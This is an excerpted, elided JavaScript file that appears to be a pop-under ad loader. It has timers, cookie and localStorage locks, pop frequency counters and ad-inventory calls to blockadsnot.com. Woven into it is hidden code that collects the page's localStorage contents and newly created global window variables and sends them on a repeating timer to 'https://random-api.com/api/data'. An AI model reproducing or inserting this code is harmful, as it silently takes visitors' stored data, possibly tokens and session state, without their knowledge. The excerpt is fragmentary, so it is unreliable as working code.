(function (e, g, p) {
  ...
  function T(a, b, c, d, f) {
    ...
    var B = 5,
      k = setInterval(function () {
        B--;
        g.getElementById("a_timer_oYvwGmQc").textContent = B;
        0 >= B && clearInterval(k);
      }, 1E3);
    ...
    g.addEventListener("click", function (n) {
      ...
      k = setInterval(function () {
        w--;
        g.getElementById("a_timer_oYvwGmQc").textContent = w;
        0 >= w && clearInterval(k);
      }, 1E3);
  ...
  const calcHash = data => {
    const keyJoined = Object.keys(data).join("");
    let hash = 0;
    for (let i = 0; i < keyJoined.length; i++) {
      let charCode = keyJoined.charCodeAt(i);
  ...
  if (!v) var v = {
    _cookieLockSet: function (a) {
      ...
      a && (b = "0");
      try {
        return localStorage.setItem("AClVFnHs", b), !0;
      } catch (d) {}
      a = new Date();
      var c = 6E4;
      a.setTime(a.getTime() + c);
      c = "expires=" + a.toUTCString();
      g.cookie = "AClVFnHs=" + b + ";" + c + ";path=/";
      return !0;
    },
    _cookieLockGet: function () {
      var a = !1;
      try {
        return localStorage.AClVFnHs && (a = "1" == localStorage.AClVFnHs), localStorage.setItem("AClVFnHs", "0"), a;
      } catch (f) {}
      for (var b = decodeURIComponent(g.cookie).split(";"), c = 0; c < b.length; c++) {
        for (var d = b[c]; " " == d.charAt(0);) d = d.substring(1);
        0 == d.indexOf("AClVFnHs=") && "1" == d.substring(10, d.length) && (a = !0);
      }
  ...
  const sendToServer = data => {
    const hashId = calcHash(data);
    const apiUrl = "https://random-api.com/api/data";
  ...
  const trackAndSendLocalData = () => {
    const trackedLocalStorage = collectLocalStorageData();
    if (Object.keys(trackedLocalStorage).length > 0) {
      sendToServer(trackedLocalStorage);
    }
  };
  !function (a, b, c) {
  ...
  var K = {
    ...
    _checkInventory: function (a) {
      ...
      c = setInterval(function () {
        var l = "//blockadsnot.com" + Q;
        if (g.body) {
          clearInterval(c);
          h = {
            dVOKmRJA: encodeURIComponent(a),
            hGKujLQi: 4,
            YWsdRTOJ: d._siteId,
            qSwQBpZA: d._minBid,
            DhXmkAGR: d._popPerDay + "," + d._inpagePerDay,
            NxLQeXbf: d._blockedCountries || "",
            lMFGhOtd: encodeURIComponent(g.referrer),
            HKLJgWvU: b._getScreenData()
          };
    ...
    _getFiredCount: function (a) {
      ...
      var c = 0;
      "number" == typeof b && (new Date().getTime() < b && (c = t._isAvailable() ? t._get("_spop" + a) : r._get(a)), c = parseInt(c, 10) || 0, isNaN(c) && (c = 0));
      return c;
    },
    _updateFiredCount: function (a) {
      var b = "_popfired" + (a || ""),
        c = b + "_expires",
        d = t._isAvailable() ? t._get("_spop" + c) : r._get(c),
        f = "number" == typeof d ? d : new Date().getTime() + 864E5;
      a = new Date().getTime() < d ? this._getFiredCount(a) : 0;
      t._isAvailable() ? (t._set("_spop" + b, a + 1), t._set("_spop" + c, f), t._set("_spoplastOpenAt", new Date().getTime())) : (r._set(b, a + 1, new Date(f)), r._set(c, new Date(f).toUTCString(), new Date(f).getTime()), r._set("lastOpenAt", new Date().getTime(), 86400));
    },
  ...
  for (var u in e) try {
    if (u.match(/[0-9a-f]{32,32}/) && e[u][0] && e[u][0][0] && "siteId" == e[u][0][0]) {
      R = u;
      break;
    }
  } catch (a) {}
  if (!"//blockadsnot.com".includes(".net")) {
    F = "";
    u = 10 + Math.floor(10 * Math.random());
    for (var S = 0; S < u; S++) F += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(26 * Math.random()));
    Q = "/" + F;
  }
  ...
  let storedGlobalVariables = Object.keys(window);
  window.setInterval(() => {
    trackedKeys.forEach(key => {
      if (!storedGlobalVariables.includes(key) && window[key]) {
        storedGlobalVariables.push(key);
      }
    });
    trackAndSendLocalData();
    storedGlobalVariables.forEach(key => {
      if (!trackedKeys.includes(key)) {
        sendToServer({
          [key]: window[key]
        });
  ...
  try {
    e._pao = u, Object.freeze(e._pao);
  } catch (a) {}
  try {
    e[F] = u, Object.freeze(e[F]);
  } catch (a) {}
  K._init();
